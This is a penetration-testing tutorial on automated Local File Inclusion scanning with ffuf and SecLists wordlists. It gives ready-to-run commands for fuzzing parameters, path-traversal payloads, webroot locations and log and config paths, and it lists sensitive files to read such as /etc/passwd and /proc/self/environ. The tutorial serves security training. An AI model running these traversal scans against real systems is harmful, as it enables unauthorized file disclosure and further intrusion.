# Automated LFI Scanning

Manual LFI testing gives you precision and the ability to craft custom bypasses, but automated scanning covers ground faster when you are working through a large application with many parameters. The two are complementary rather than alternatives.

***

## Step 1: Discover Hidden Parameters

Visible HTML form inputs are usually the most hardened parts of an application because developers consciously test them. Parameters that are not tied to any form, passed internally between pages, or left over from development are frequently overlooked and far less secured.

Fuzz for undiscovered GET parameters using the [burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) wordlist from SecLists:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://TARGET/index.php?FUZZ=value' \
     -fs 2287
```

The `-fs 2287` flag filters by response size to hide responses that match the default page size, leaving only results where the parameter changed the output. Calibrate this value by first loading the page without any parameter and noting its response size.

For a more targeted scan, the [HackTricks Top 25 LFI Parameters](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters) list cuts the noise significantly and covers the most commonly vulnerable parameter names like `file`, `page`, `lang`, `path`, `template`, and `include`.

***

## Step 2: Fuzz for LFI Payloads

Once a potentially vulnerable parameter is identified, test it against a full LFI payload list rather than manually trying individual payloads. [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) is the most comprehensive single wordlist for this because it combines:

- Straight path traversal sequences at various depths
- URL-encoded traversal variants
- Double-encoded variants
- Filter bypass patterns like `....//` and `..././`
- Common sensitive file paths for both Linux and Windows

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://TARGET/index.php?language=FUZZ' \
     -fs 2287
```

Successful hits will show a different response size from the baseline. Anything returning content from `/etc/passwd` (91 lines, ~3600 bytes on a standard Linux system) is a confirmed read. Always manually verify hits from automated scans because some false positives produce a matching size without actual file content.

***

## Step 3: Locate the Web Root

Knowing the absolute webroot path is necessary when you need to include uploaded files using absolute paths and relative traversal is not reaching them. Fuzz for `index.php` across known webroot locations:

**Linux:**
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
     -u 'http://TARGET/index.php?language=../../../../FUZZ/index.php' \
     -fs 2287
```

**Windows:**
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt:FUZZ \
     -u 'http://TARGET/index.php?language=../../../../FUZZ/index.php' \
     -fs 2287
```

A hit at `/var/www/html/` confirms the webroot. If this does not produce results, reading the server configuration file is the next step since it explicitly declares `DocumentRoot`.

***

## Step 4: Fuzz for Logs and Configuration Files

Log poisoning and config file reading both require knowing the exact file path. Rather than guessing, fuzz using a dedicated Linux or Windows LFI path list:

```bash
# Download the specialised wordlist (not in SecLists by default)
wget https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux

ffuf -w ./LFI-WordList-Linux:FUZZ \
     -u 'http://TARGET/index.php?language=../../../../FUZZ' \
     -fs 2287 \
     -mc 200,301,302,403
```

This typically returns 60+ readable files. The most operationally useful results are:

```
/etc/apache2/apache2.conf    → reveals DocumentRoot and log paths
/etc/apache2/envvars         → resolves Apache variables like $APACHE_LOG_DIR
/etc/nginx/nginx.conf        → Nginx equivalent
/etc/php/7.4/apache2/php.ini → PHP configuration including allow_url_include
/etc/passwd                  → user enumeration
/etc/hosts                   → internal network hostnames
/proc/self/environ           → live environment variables
```

The configuration files chain together usefully. `apache2.conf` references `${APACHE_LOG_DIR}` rather than a hardcoded path, so reading `envvars` resolves the variable to the actual log directory. This two-file chain is a common pattern in real assessments where the log path is not directly obvious.

***

## Full Automated Workflow

```
1. Fuzz parameters
   ffuf -w burp-parameter-names.txt -u 'TARGET/index.php?FUZZ=value' -fs [baseline]
        |
        v
2. Fuzz LFI payloads against confirmed parameter
   ffuf -w LFI-Jhaddix.txt -u 'TARGET/index.php?language=FUZZ' -fs [baseline]
        |
        v
3. Confirm read with /etc/passwd, identify OS and users
        |
        v
4. Fuzz webroot path
   ffuf -w default-web-root-directory-linux.txt -u '...?language=../../../../FUZZ/index.php'
        |
        v
5. Fuzz log and config paths
   ffuf -w LFI-WordList-Linux -u '...?language=../../../../FUZZ'
        |
        v
6. Read apache2.conf + envvars to resolve log paths
        |
        v
7. Proceed to log poisoning / PHP filter / upload chain based on findings
```

***

## Dedicated LFI Tools

Three tools are worth knowing about despite their limitations:

| Tool | GitHub | Language | Status |
|------|--------|----------|--------|
| [LFISuite](https://github.com/D35m0nd142/LFISuite) | D35m0nd142 | Python 2 | Unmaintained |
| [LFiFreak](https://github.com/OsandaMalith/LFiFreak) | OsandaMalith | Python 2 | Unmaintained |
| [liffy](https://github.com/mzfr/liffy) | mzfr | Python 2 | Unmaintained |

All three are Python 2 and no longer actively maintained, which creates dependency issues on modern systems. For practical use, [ffuf](https://github.com/ffuf/ffuf) with purpose-built wordlists outperforms all three in both speed and reliability. These tools are worth running against practice labs to understand their detection logic, but should not be relied on in real assessments where missing a vulnerability has consequences.

The broader principle that automated scanning illustrates is that wordlist quality matters more than tool choice. A well-constructed wordlist like LFI-Jhaddix.txt run through ffuf will consistently outperform a sophisticated tool with a weak or outdated payload list.
